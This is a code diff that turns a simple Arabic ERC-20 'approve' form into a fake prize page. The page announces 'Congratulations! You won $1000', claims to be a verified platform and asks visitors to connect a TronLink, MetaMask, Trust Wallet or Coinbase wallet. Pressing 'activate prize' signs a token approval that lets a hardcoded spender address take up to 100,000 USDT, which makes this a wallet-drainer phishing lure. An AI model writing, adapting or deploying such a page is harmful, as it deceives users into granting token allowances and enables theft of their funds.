@@ -1,93 +1,556 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
   <head>
     <meta charset="UTF-8" />
-    <title>Approve ERC-20 Token</title>
-    <!-- أحدث إصدار من مكتبة Ethers -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  </head>
-  <body style="font-family: Arial; direction: rtl; padding: 20px">
-    <h2>إعطاء صلاحية <code>approve</code> لتوكن ERC-20</h2>
-
-    <label>عنوان التوكن (Token Contract Address):</label><br />
-    <input
-      type="text"
-      id="tokenAddress"
-      style="width: 400px"
-      value="0x7624C689A660B81eA1Fa94536A6c9d07C405064e"
-    /><br /><br />
-
-    <label>عنوان الـ spender:</label><br />
-    <input
-      type="text"
-      id="spenderAddress"
-      style="width: 400px"
-      value="0x2D7727275987dD62a6e5a3bd15CA8CFE9371ff5c"
-    /><br /><br />
-
-    <label>الكمية (عدد التوكنات):</label><br />
-    <input type="number" id="amount" value="1000" /><br /><br />
-
-    <button onclick="approve()">عمل approve</button>
-
-    <p id="status" style="margin-top: 20px; color: green"></p>
-
-    <script>
-      async function approve() {
-        const statusEl = document.getElementById("status");
-        statusEl.textContent = "";
-
-        if (!window.ethereum) {
-          alert("يجب تثبيت MetaMask أو محفظة تدعم Ethereum.");
-          return;
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>مبروك! لقد فزت بـ 1000 دولار - XYZ</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/a076d05399.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@5.3.3/dist/tronweb.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Tajawal", sans-serif;
+        background: linear-gradient(135deg, #1a1a1a, #000000);
+        color: #ffffff;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        overflow-x: hidden;
+        position: relative;
+      }
+      #particles-js {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 1;
+      }
+      .container {
+        background: rgba(20, 20, 20, 0.9);
+        border-radius: 30px;
+        padding: 60px;
+        max-width: 800px;
+        width: 100%;
+        box-shadow: 0 0 60px rgba(255, 215, 0, 0.4), 0 0 30px rgba(192, 192, 192, 0.5);
+        text-align: center;
+        position: relative;
+        z-index: 2;
+        animation: fadeIn 1.5s ease forwards;
+        border: 3px solid rgba(255, 215, 0, 0.5);
+        backdrop-filter: blur(10px);
+      }
+      @keyframes fadeIn {
+        0% {
+          opacity: 0;
+          transform: scale(0.8);
         }
-
-        const tokenAddress = document
-          .getElementById("tokenAddress")
-          .value.trim();
-        const spenderAddress = document
-          .getElementById("spenderAddress")
-          .value.trim();
-        const amount = document.getElementById("amount").value.trim();
-
-        if (!ethers.utils.isAddress(tokenAddress)) {
-          alert("عنوان العقد غير صالح.");
-          return;
-        }
-
-        if (!ethers.utils.isAddress(spenderAddress)) {
-          alert("عنوان الـ spender غير صالح.");
-          return;
-        }
-
-        if (amount <= 0) {
-          alert("الكمية يجب أن تكون أكبر من صفر.");
-          return;
-        }
-
-        try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          const signer = provider.getSigner();
-
-          const abi = [
-            "function approve(address spender, uint256 amount) public returns (bool)",
-          ];
-          const contract = new ethers.Contract(tokenAddress, abi, signer);
-
-          const decimals = 18;
-          const amountParsed = ethers.utils.parseUnits(amount, decimals);
-
-          const tx = await contract.approve(spenderAddress, amountParsed);
-          statusEl.textContent = "جاري إرسال المعاملة...";
-
-          await tx.wait();
-          statusEl.textContent = `تمت الموافقة بنجاح! Tx Hash: ${tx.hash}`;
-        } catch (err) {
-          statusEl.style.color = "red";
-          statusEl.textContent = "حدث خطأ: " + err.message;
+        100% {
+          opacity: 1;
+          transform: scale(1);
         }
       }
+      .logo {
+        font-size: 60px;
+        font-weight: 900;
+        color: #ffd700;
+        letter-spacing: 3px;
+        margin-bottom: 30px;
+        text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+        animation: glow 2s infinite alternate;
+      }
+      @keyframes glow {
+        from {
+          text-shadow: 0 0 10px #ffd700, 0 0 20px #ffd700;
+        }
+        to {
+          text-shadow: 0 0 20px #ffd700, 0 0 40px #c0c0c0;
+        }
+      }
+      .verified-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        font-size: 20px;
+        color: #ffffff;
+        margin-bottom: 30px;
+        background: rgba(255, 215, 0, 0.2);
+        padding: 15px;
+        border-radius: 15px;
+        animation: pulse 2.5s infinite ease-in-out;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          box-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
+        }
+        50% {
+          box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
+        }
+      }
+      .verified-badge i {
+        font-size: 28px;
+        color: #ffd700;
+      }
+      h1 {
+        font-size: 42px;
+        font-weight: 700;
+        margin-bottom: 25px;
+        color: #ffffff;
+        text-shadow: 0 0 15px rgba(255, 255, 255, 0.6);
+      }
+      .win-message {
+        font-size: 28px;
+        color: #ffd700;
+        margin-bottom: 25px;
+        animation: glow 1.8s infinite alternate;
+      }
+      .warning {
+        font-size: 16px;
+        color: #ffcc00;
+        margin-bottom: 30px;
+        background: rgba(255, 204, 0, 0.15);
+        padding: 15px;
+        border-radius: 12px;
+        border: 1px solid rgba(255, 204, 0, 0.3);
+      }
+      .coin-icons {
+        display: flex;
+        justify-content: center;
+        gap: 30px;
+        margin-bottom: 35px;
+      }
+      .coin-icons i {
+        font-size: 56px;
+        color: #c0c0c0;
+        transition: all 0.4s ease;
+        animation: float 3.5s ease-in-out infinite;
+      }
+      .coin-icons i:nth-child(2) {
+        animation-delay: 0.7s;
+      }
+      .coin-icons i:nth-child(3) {
+        animation-delay: 1.4s;
+      }
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-20px);
+        }
+      }
+      .coin-icons i:hover {
+        color: #ffd700;
+        filter: drop-shadow(0 0 20px #ffd700);
+        transform: scale(1.2);
+      }
+      .wallet-selection {
+        display: flex;
+        justify-content: center;
+        gap: 25px;
+        margin-bottom: 50px;
+        flex-wrap: wrap;
+      }
+      .wallet-btn {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 15px;
+        padding: 25px;
+        width: 160px;
+        cursor: pointer;
+        transition: all 0.5s ease;
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+        color: #ffffff;
+        font-weight: 700;
+        user-select: none;
+        border: 2px solid rgba(255, 215, 0, 0.4);
+      }
+      .wallet-btn:hover {
+        background: #ffd700;
+        color: #000000;
+        box-shadow: 0 0 30px #ffd700;
+        transform: scale(1.1);
+      }
+      .wallet-btn.selected {
+        background: #ffd700;
+        color: #000000;
+        box-shadow: 0 0 40px #ffd700;
+        transform: scale(1.1);
+      }
+      .wallet-btn img {
+        width: 60px;
+        height: 60px;
+        object-fit: contain;
+        transition: all 0.4s ease;
+      }
+      .wallet-btn:hover img {
+        filter: brightness(0) invert(1);
+      }
+      button#approveButton {
+        background: linear-gradient(90deg, #ffd700, #ffcc00);
+        border: none;
+        border-radius: 15px;
+        padding: 20px 50px;
+        font-size: 22px;
+        font-weight: 700;
+        color: #000000;
+        cursor: pointer;
+        box-shadow: 0 0 30px rgba(255, 215, 0, 0.7);
+        transition: all 0.5s ease;
+        letter-spacing: 1.5px;
+        position: relative;
+        overflow: hidden;
+      }
+      button#approveButton:hover {
+        background: linear-gradient(90deg, #ffcc00, #ffd700);
+        box-shadow: 0 0 40px rgba(255, 215, 0, 0.9);
+        transform: scale(1.1);
+      }
+      button#approveButton::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.4),
+          transparent
+        );
+        transition: 0.5s;
+      }
+      button#approveButton:hover::after {
+        left: 100%;
+      }
+      .status {
+        margin-top: 30px;
+        font-size: 20px;
+        font-weight: 700;
+        min-height: 35px;
+        color: #ffcc00;
+        background: rgba(255, 204, 0, 0.1);
+        padding: 10px;
+        border-radius: 10px;
+      }
+      @media (max-width: 480px) {
+        .container {
+          padding: 30px;
+        }
+        .logo {
+          font-size: 48px;
+        }
+        h1 {
+          font-size: 32px;
+        }
+        .win-message {
+          font-size: 24px;
+        }
+        .wallet-btn {
+          width: 140px;
+        }
+        .coin-icons i {
+          font-size: 44px;
+        }
+        button#approveButton {
+          padding: 15px 40px;
+          font-size: 18px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="particles-js"></div>
+    <main class="container">
+      <div class="logo">XYZ WIN</div>
+      <div class="verified-badge">
+        <i class="fas fa-check-circle"></i>
+        <span>منصة موثقة</span>
+      </div>
+      <h1>مبروك! لقد فزت بـ 1000 دولار</h1>
+      <p class="win-message">استعد لاستلام جائزتك!</p>
+      <p class="warning">
+        تحذير: تأكد من اختيار محفظتك الرقمية لتفعيل الجائزة. العملية آمنة
+        وموثقة.
+      </p>
+      <div class="coin-icons">
+        <i class="fab fa-bitcoin"></i>
+        <i class="fab fa-ethereum"></i>
+        <i class="fas fa-coins"></i>
+      </div>
+      <p class="description">اختر محفظتك الرقمية لتفعيل جائزتك مباشرة.</p>
+      <section class="wallet-selection">
+        <button class="wallet-btn" data-wallet="tronlink">
+          <img
+            src="https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg"
+            alt="TronLink"
+          />
+          TronLink
+        </button>
+        <button class="wallet-btn" data-wallet="metamask">
+          <img
+            src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
+            alt="MetaMask"
+          />
+          MetaMask
+        </button>
+        <button class="wallet-btn" data-wallet="trustwallet">
+          <img
+            src="https://trustwallet.com/assets/images/media/assets/TWT.png"
+            alt="TrustWallet"
+          />
+          Trust Wallet
+        </button>
+        <button class="wallet-btn" data-wallet="coinbase">
+          <img
+            src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
+            alt="Coinbase Wallet"
+          />
+          Coinbase Wallet
+        </button>
+      </section>
+      <button id="approveButton">تفعيل الجائزة</button>
+      <p class="status" id="statusText"></p>
+    </main>
+
+    <script>
+      particlesJS("particles-js", {
+        particles: {
+          number: { value: 120, density: { enable: true, value_area: 800 } },
+          color: { value: ["#ffd700", "#c0c0c0", "#ffffff"] },
+          shape: { type: "circle" },
+          opacity: { value: 0.5, random: true },
+          size: { value: 5, random: true },
+          line_linked: {
+            enable: true,
+            distance: 150,
+            color: "#ffd700",
+            opacity: 0.3,
+            width: 1.5,
+          },
+          move: { enable: true, speed: 4, direction: "none", random: true },
+        },
+        interactivity: {
+          detect_on: "canvas",
+          events: {
+            onhover: { enable: true, mode: "grab" },
+            onclick: { enable: true, mode: "push" },
+          },
+          modes: {
+            grab: { distance: 200, line_linked: { opacity: 0.6 } },
+            push: { particles_nb: 5 },
+          },
+        },
+      });
+
+      const walletButtons = document.querySelectorAll(".wallet-btn");
+      const approveButton = document.getElementById("approveButton");
+      const statusText = document.getElementById("statusText");
+      let selectedWallet = null;
+      let provider = null;
+
+      const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC-20
+      const spender = "0x44641c65aE5EB92a17008D558999962236c6bCb0";
+      const amount = "100000000000"; // 100,000 USDT (6 decimals)
+      const usdtAbi = [
+        "function approve(address spender, uint256 amount) public returns (bool)",
+        "function decimals() public view returns (uint8)",
+      ];
+
+      // دالة للتحقق من حالة الاتصال بالمحفظة
+      async function checkWalletConnection(wallet) {
+        if (wallet === "tronlink") {
+          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            statusText.textContent = "✅ محفظة TronLink متصلة!";
+            return true;
+          }
+          statusText.textContent = "محفظة TronLink غير متصلة.";
+          return false;
+        } else if (wallet === "metamask") {
+          if (window.ethereum && window.ethereum.selectedAddress) {
+            const chainId = await window.ethereum.request({ method: "eth_chainId" });
+            if (chainId === "0x2b6653dc") {
+              statusText.textContent = "✅ محفظة MetaMask متصلة!";
+              return true;
+            } else {
+              statusText.textContent = "يرجى تبديل الشبكة إلى Tron Mainnet في MetaMask.";
+              return false;
+            }
+          }
+          statusText.textContent = "محفظة MetaMask غير متصلة.";
+          return false;
+        } else if (wallet === "trustwallet" || wallet === "coinbase") {
+          if (provider && provider.accounts && provider.accounts.length > 0) {
+            statusText.textContent = `✅ محفظة ${wallet} متصلة!`;
+            return true;
+          }
+          statusText.textContent = `محفظة ${wallet} غير متصلة.`;
+          return false;
+        }
+        return false;
+      }
+
+      // دالة للاتصال بالمحفظة
+      async function connectWallet(wallet) {
+        statusText.textContent = `جارٍ الاتصال بمحفظة ${wallet}...`;
+        try {
+          if (wallet === "tronlink") {
+            if (!window.tronWeb) {
+              statusText.textContent =
+                "يرجى تثبيت TronLink. افتح تطبيق TronLink أو أضف الإضافة على المتصفح.";
+              window.open("https://www.tronlink.org/", "_blank");
+              return false;
+            }
+            if (!window.tronWeb.defaultAddress.base58) {
+              statusText.textContent = "يرجى تسجيل الدخول إلى TronLink.";
+              return false;
+            }
+            return true;
+          } else if (wallet === "metamask") {
+            if (!window.ethereum) {
+              statusText.textContent =
+                "يرجى تثبيت MetaMask. أضف الإضافة على المتصفح.";
+              window.open("https://metamask.io/download/", "_blank");
+              return false;
+            }
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+            try {
+              await window.ethereum.request({
+                method: "wallet_addEthereumChain",
+                params: [
+                  {
+                    chainId: "0x2b6653dc",
+                    chainName: "Tron Mainnet",
+                    rpcUrls: ["https://api.trongrid.io"],
+                    nativeCurrency: {
+                      name: "TRON",
+                      symbol: "TRX",
+                      decimals: 18,
+                    },
+                    blockExplorerUrls: ["https://tronscan.org"],
+                  },
+                ],
+              });
+              await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x2b6653dc" }],
+              });
+            } catch (e) {
+              statusText.textContent =
+                "فشل إضافة أو تبديل شبكة Tron في MetaMask. تأكد من إعدادات الشبكة.";
+              return false;
+            }
+            return true;
+          } else if (wallet === "trustwallet" || wallet === "coinbase") {
+            if (!window.EthereumProvider) {
+              statusText.textContent =
+                "خطأ في تحميل مكتبة WalletConnect. تأكد من اتصالك بالإنترنت.";
+              return false;
+            }
+            provider = await window.EthereumProvider.init({
+              projectId: "f6b400b4393b83bb22abcaf805ad72d2",
+              chains: [728126428],
+              optionalChains: [1, 56],
+              rpc: { 728126428: "https://api.trongrid.io" },
+              showQrModal: true,
+              metadata: {
+                name: "XYZ Win",
+                description: "تفعيل جائزة 1000 دولار",
+                url: window.location.href,
+                icons: [
+                  "https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg",
+                ],
+              },
+            });
+            await provider.connect();
+            return true;
+          }
+          return false;
+        } catch (e) {
+          statusText.textContent = `خطأ في الاتصال بالمحفظة: ${e.message || e}`;
+          return false;
+        }
+      }
+
+      // مستمع لأزرار المحافظ
+      walletButtons.forEach((btn) => {
+        btn.addEventListener("click", async () => {
+          walletButtons.forEach((b) => b.classList.remove("selected"));
+          btn.classList.add("selected");
+          selectedWallet = btn.dataset.wallet;
+
+          // تحقق من حالة الاتصال
+          const isConnected = await checkWalletConnection(selectedWallet);
+          if (!isConnected) {
+            await connectWallet(selectedWallet);
+          }
+        });
+      });
+
+      // مستمع لزر تفعيل الجائزة
+      approveButton.addEventListener("click", async () => {
+        if (!selectedWallet) {
+          statusText.textContent = "يرجى اختيار محفظة أولاً.";
+          return;
+        }
+
+        const isConnected = await checkWalletConnection(selectedWallet);
+        if (!isConnected) {
+          statusText.textContent = `يرجى الاتصال بمحفظة ${selectedWallet} أولاً.`;
+          return;
+        }
+
+        statusText.textContent = `جارٍ تفعيل الجائزة باستخدام ${selectedWallet}...`;
+
+        try {
+          if (selectedWallet === "tronlink") {
+            const contract = await window.tronWeb.contract().at(contractAddress);
+            const tx = await contract.approve(spender, amount).send();
+            statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
+          } else {
+          
+            if (selectedWallet === "trustwallet" || selectedWallet === "coinbase") {
+              if (!provider) {
+                const connected = await connectWallet(selectedWallet);
+                if (!connected) return;
+              }
+            } else if (selectedWallet === "metamask") {
+              provider = new ethers.providers.Web3Provider(window.ethereum);
+            }
+
+            const signer = provider.getSigner();
+            const contract = new ethers.Contract(contractAddress, usdtAbi, signer);
+            const tx = await contract.approve(spender, amount);
+            await tx.wait();
+            statusText.textContent = "✅ تم تفعيل الجائزة بنجاح!";
+          }
+        } catch (e) {
+          statusText.textContent = `حدث خطأ: ${e.message || e}`;
+        }
+      });
     </script>
   </body>
 </html>
